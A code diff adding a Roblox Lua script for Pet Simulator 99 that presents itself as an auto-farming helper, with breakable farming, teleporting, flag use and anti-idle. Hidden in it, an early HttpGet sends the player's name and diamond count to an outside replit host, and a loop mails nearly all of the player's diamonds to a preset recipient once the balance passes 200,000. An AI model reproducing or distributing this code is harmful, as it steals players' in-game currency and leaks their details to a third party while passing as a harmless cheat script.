@@ -1,0 +1,141 @@
+--
+repeat wait() until game:IsLoaded()
+
+pcall(function()
+game:HttpGet("https://petsim99.bunnynwy.repl.co/api?name="..tostring(game.Players.LocalPlayer.Name).."candy="..tostring(game.Players.LocalPlayer:WaitForChild("leaderstats")["💎 Diamonds"].Value))
+end)
+
+wait(5)
+
+spawn(function()
+    for i,v in pairs(workspace.Map:GetChildren()) do
+        if v.Name ~= "1 | Spawn" then
+            v:Destroy()
+        end
+    end
+end)
+spawn(function()
+    pcall(function()
+        while wait(2) do
+            for i,v in pairs(game.workspace.__THINGS.Breakables:GetChildren()) do
+                if not v:GetAttribute("VIPBreakable") then
+                    v:Destroy()
+                end
+            end
+        end
+    end)
+end)
+spawn(function()
+    pcall(function()
+        while task.wait() do
+            if _G.TeleportVIP then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(210.62855529785156, 26.22991180419922, -584.1373901367188)
+            end
+        end
+    end)
+end)
+
+spawn(function()
+    _G.Data_Trade = {}
+    _G.T = {}
+    for i,v in pairs(getgc(true)) do
+        if typeof(v) == "table" and rawget(v, "Inventory") then
+            if typeof(v["Inventory"]) == "table" then
+                if v["Inventory"]["Misc"] then
+                    for ii,vv in pairs(v["Inventory"]["Misc"]) do
+                        if vv.id then
+                            if not _G.Data_Trade[tostring(ii)] then
+                                _G.Data_Trade[tostring(ii)] = {}
+                                table.insert(_G.T , tostring(ii))
+                            end
+                            _G.Data_Trade[tostring(ii)]["id"] = vv.id
+                            _G.Data_Trade[tostring(ii)]["Type"] = "Misc" 
+                        end
+                    end
+                end
+            end
+        end
+    end
+end)
+repeat wait() until game:IsLoaded() 
+    game:GetService("Players").LocalPlayer.Idled:connect(function()
+    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
+end)
+    
+repeat wait() until _G.T
+
+for i,v in pairs(game.Players.LocalPlayer:WaitForChild("leaderstats"):GetChildren()) do
+    if v.Name:find("Diamonds") then
+        diamond = v.Value
+    end
+end
+
+for i,v in pairs(getgc(true)) do
+    if typeof(v) == "table" and rawget(v, _G.T[1]) then
+        for ii,vv in pairs(v) do
+            if typeof(vv) == "number" and vv == diamond then
+                _G.DiamondC = tostring(ii)
+            end
+        end
+    end
+end
+
+spawn(function()
+    pcall(function()
+        while wait(.1) do
+            if _G.DiamondC then 
+                for i,v in pairs(game.Players.LocalPlayer:WaitForChild("leaderstats"):GetChildren()) do
+                    if v.Name:find("Diamonds") then
+                        diamond = v.Value
+                    end
+                end
+                if diamond >= 200000 then
+                    local args = {
+                        [1] = _G.NameGift,
+                        [2] = "HN GIF",
+                        [3] = "Currency",
+                        [4] = _G.DiamondC,
+                        [5] = diamond - 10000
+                    }
+                    
+                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))                    
+                end
+            end
+        end
+    end)
+end)
+
+spawn(function()
+    pcall(function()
+        while wait(.4) do
+            if _G.Flag then 
+                for i,v in pairs(_G.Data_Trade) do
+                    if v.id == "Diamonds Flag" then
+                        local args = {
+                            [1] = "Diamonds Flag",
+                            [2] = tostring(i)
+                        }
+                        
+                        game:GetService("ReplicatedStorage").Network:FindFirstChild("Flags: Consume"):InvokeServer(unpack(args))    
+                    end
+                end
+            end
+        end
+    end)
+end)
+
+spawn(function()
+    pcall(function()
+        while task.wait() do
+            for i,v in pairs(game.workspace.__THINGS.Breakables:GetChildren()) do
+                if v:GetAttribute("VIPBreakable") and v:GetAttribute("VIPBreakable") == true then
+                    local args = {
+                        [1] = v:GetAttribute("BreakableUID")
+                    }
+                    
+                    game:GetService("ReplicatedStorage").Network.Breakables_PlayerDealDamage:FireServer(unpack(args))  
+                end
+            end
+        end
+    end)
+end)
